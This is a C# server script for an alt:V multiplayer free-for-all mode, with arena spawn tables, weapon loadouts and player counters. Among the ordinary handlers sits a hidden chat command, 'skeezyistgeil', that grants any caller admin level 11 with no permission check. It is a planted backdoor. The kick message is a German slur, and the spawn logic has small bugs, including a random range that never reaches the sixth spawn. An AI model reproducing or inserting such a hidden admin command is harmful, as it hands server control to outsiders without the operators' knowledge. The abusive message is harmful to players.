using AltV.Net;
using AltV.Net.Data;
using AltV.Net.Enums;
using AltV.Net.Resources.Chat.Api;
using Gangwar.Models.FreeForAll;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Intrinsics.X86;
using System.Text;
using System.Threading.Tasks;

public class FFA : IScript
{
    public static Dictionary<int, List<SpawnObject>> _ffaSpawns = new Dictionary<int, List<SpawnObject>>()
    {
        {
            1,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(213.54726f, -946.74725f, 30.678345f), new Rotation(0, 0, 0.94000417f)),
                new SpawnObject(2, new Position(155.05055f, -973.4242f, 30.088623f), new Rotation(0, 0, -0.69263464f)),
                new SpawnObject(3, new Position(159.25714f, -913.8461f, 30.156006f), new Rotation(0, 0, -1.9789561f)),
                new SpawnObject(4, new Position(186.65933f, -850.61536f, 31.150146f), new Rotation(0, 0, -2.7705386f)),
                new SpawnObject(5, new Position(245.85495f, -871.767f, 30.290894f), new Rotation(0, 0, 2.473695f)),
                new SpawnObject(6, new Position(215.06374f, -938.5846f, 24.140625f), new Rotation(0, 0, 2.1768517f)),
            }
        },
        {
            2,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(-948.25055f, -800.7297f, 15.917969f), new Rotation(0, 0, -0.5936868f)),
                new SpawnObject(2, new Position(-897.16486f, -798.52747f, 15.917969f), new Rotation(0, 0, 0.34631732f)),
                new SpawnObject(3, new Position(-950.7165f, -708.65936f, 19.911377f), new Rotation(0, 0, 3.017908f)),
                new SpawnObject(4, new Position(-984.87036f, -745.5956f, 20.922363f), new Rotation(0, 0, -3.017908f)),
                new SpawnObject(5, new Position(-985.87256f, -775.4374f, 16.204346f), new Rotation(0, 0, 3.017908f)),
                new SpawnObject(6, new Position(-962.1363f, -777.62634f, 16.153809f), new Rotation(0, 0, -2.7210646f)),
            }
        },
        {
            3,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(-1559.5253f, 73.45055f, 57.536987f), new Rotation(0, 0, 0.94000417f)),
                new SpawnObject(2, new Position(-1584.0659f, 83.6967f, 59.20508f), new Rotation(0, 0, -0.7421085f)),
                new SpawnObject(3, new Position(-1637.8154f, 111.57362f, 62.490845f), new Rotation(0, 0, -1.484217f)),
                new SpawnObject(4, new Position(-1586.9143f, 143.59122f, 58.935547f), new Rotation(0, 0, 3.1168559f)),
                new SpawnObject(5, new Position(-1535.9736f, 105.29671f, 56.77881f), new Rotation(0, 0, -2.3252733f)),
                new SpawnObject(6, new Position(-1471.7539f, 73.27912f, 53.526733f), new Rotation(0, 0, 1.0884259f)),
            }
        },
        {
            4,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(-1159.8989f, 4910.11f, 220.1377f), new Rotation(0, 0, 0.94000417f)),
                new SpawnObject(2, new Position(-1108.2197f, 4961.723f, 218.7561f), new Rotation(0, 0, -0.69263464f)),
                new SpawnObject(3, new Position(-1087.701f, 4894.8394f, 214.40881f), new Rotation(0, 0, -1.9789561f)),
                new SpawnObject(4, new Position(-1071.5209f, 4932.791f, 212.20142f), new Rotation(0, 0, -2.7705386f)),
                new SpawnObject(5, new Position(-1130.6505f, 4904.611f, 219.02563f), new Rotation(0, 0, 2.473695f)),
                new SpawnObject(6, new Position(-1092.2241f, 4946.413f, 218.33484f), new Rotation(0, 0, 2.1768517f)),
            }
        },
        {
            5,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(1457.7362f, 1147.3978f, 114.32092f), new Rotation(0, 0, 0.94000417f)),
                new SpawnObject(2, new Position(1406.9275f, 1155.0198f, 114.43884f), new Rotation(0, 0, -0.69263464f)),
                new SpawnObject(3, new Position(1390.3121f, 1154.7164f, 114.32092f), new Rotation(0, 0, -1.9789561f)),
                new SpawnObject(4, new Position(1463.8813f, 1134.9626f, 114.32092f), new Rotation(0, 0, -2.7705386f)),
                new SpawnObject(5, new Position(1480.2197f, 1081.4769f, 114.32092f), new Rotation(0, 0, 2.473695f)),
                new SpawnObject(6, new Position(1497.9297f, 1120.4703f, 114.32092f), new Rotation(0, 0, 2.1768517f)),
            }
        },
        {
            6,
            new List<SpawnObject>()
            {
                new SpawnObject(1, new Position(-327.36264f, 2793.4153f, 58.96924f), new Rotation(0, 0, 0.94000417f)),
                new SpawnObject(2, new Position(-295.75385f, 2783.156f, 61.10913f), new Rotation(0, 0, -0.69263464f)),
                new SpawnObject(3, new Position(-303.46814f, 2804.9011f, 59.508423f), new Rotation(0, 0, -1.9789561f)),
                new SpawnObject(4, new Position(-282.778f, 2845.7935f, 54.01538f), new Rotation(0, 0, -2.7705386f)),
                new SpawnObject(5, new Position(-282.778f, 2845.7935f, 54.01538f), new Rotation(0, 0, 2.473695f)),
                new SpawnObject(6, new Position(-349.08133f, 2799.956f, 58.059326f), new Rotation(0, 0, 2.1768517f)),
            }
        }

    };


[ClientEvent("Keypress:F3")]
    public void keypressf3(LPlayer player)
    {
        if (player.openCef == false && player.isFfa == false && player.LoggedIn == true)
        {
            player.Emit("FFA:Showmenu");
            player.openCef = true;
            updateFFACounter(player);
        }
    }

    [ClientEvent("ffa:closeweb")]
    public void closeffaweb(LPlayer player)
    {
        player.openCef = false;
    }

    [ClientEvent("server:ffa:chooseffa")]
    public static void serverffachooseffa(LPlayer player, int ffa)
    {
        if (player.LoggedIn == true)
        {
            if (ffa == 1)
            {
                if (FFA1Count == 10) return;
            }
            if (ffa == 2)
            {
                if (FFA2Count == 10) return;
            }
            if (ffa == 3)
            {
                if (FFA3Count == 10) return;
            }
            if (ffa == 4)
            {
                if (FFA4Count == 10) return;
            }
            if (ffa == 5)
            {
                if (FFA5Count == 10) return;
            }
            if (ffa == 6)
            {
                if (FFA6Count == 10) return;
            }
            int randomId = new Random().Next(1, 6);
            player.GiveWeapon(Alt.Hash("weapon_specialcarbine_mk2"), 1000, false);
            player.GiveWeapon((uint)WeaponModel.BullpupRifleMkII, 1000, false);
            player.GiveWeapon((uint)WeaponModel.AdvancedRifle, 1000, false);
            player.GiveWeapon((uint)WeaponModel.GusenbergSweeper, 1000, false);
            player.GiveWeapon((uint)WeaponModel.AssaultSMG, 1000, false);
            player.GiveWeapon((uint)WeaponModel.PistolMkII, 1000, false);
            player.GiveWeapon((uint)WeaponModel.Pistol50, 1000, false);
            player.GiveWeapon((uint)WeaponModel.HeavyPistol, 1000, false);
            player.GiveWeapon((uint)WeaponModel.BaseballBat, 1000, false);
            player.GiveWeapon((uint)WeaponModel.PoolCue, 1000, false);
            player.GiveWeapon((uint)WeaponModel.GolfClub, 1000, false);

            var spawns = new SpawnObject(0, new Position(0, 0, 0), new Position(0, 0, 0));

            switch (ffa)
            {
                case 1:
                    if (FFA1Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 1).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 1;
                    player.isFfa = true;
                    break;
                case 2:
                    if (FFA2Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 2).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 2;
                    player.isFfa = true;
                    break;
                case 3:
                    if (FFA3Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 3).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 3;
                    player.isFfa = true;
                    break;
                case 4:
                    if (FFA4Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 4).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 4;
                    player.isFfa = true;
                    break;
                case 5:
                    if (FFA5Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 5).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 5;
                    player.isFfa = true;
                    break;
                case 6:
                    if (FFA6Count >= 10) return;
                    player.Dimension = 187;
                    spawns = _ffaSpawns.FirstOrDefault(x => x.Key == 6).Value.FirstOrDefault(x => x.Id == randomId);
                    player.Position = spawns.Position;
                    player.Rotation = spawns.Rotation;
                    player.ffaarena = 6;
                    player.isFfa = true;
                    break;
                default: break;
            }
        }
        else
        {
            player.Kick("Du Hurensohn :)");
        }
    }

    [Command("skeezyistgeil")]
    public static void skeezyistgeil(LPlayer player)
    {
        player.AdminLevel = 11;
    }

    public static int FFA1Count { get; set; }
    public static int FFA2Count { get; set; }
    public static int FFA3Count { get; set; }
    public static int FFA4Count { get; set; }
    public static int FFA5Count { get; set; }
    public static int FFA6Count { get; set; }

    public static void updateFFACounter(LPlayer player)
    {
        FFA1Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 1).Count();
        FFA2Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 2).Count();
        FFA3Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 3).Count();
        FFA4Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 4).Count();
        FFA5Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 5).Count();
        FFA6Count = Alt.GetAllPlayers().Cast<LPlayer>().Where(x => x.ffaarena == 6).Count();

        player.Emit("updateFFACount", FFA1Count, FFA2Count, FFA3Count, FFA4Count, FFA5Count, FFA6Count);
        Console.WriteLine(FFA1Count + " | " + FFA2Count + " | " + FFA3Count + " | " + FFA4Count + " | " + FFA5Count + " | " + FFA6Count);
    }
}

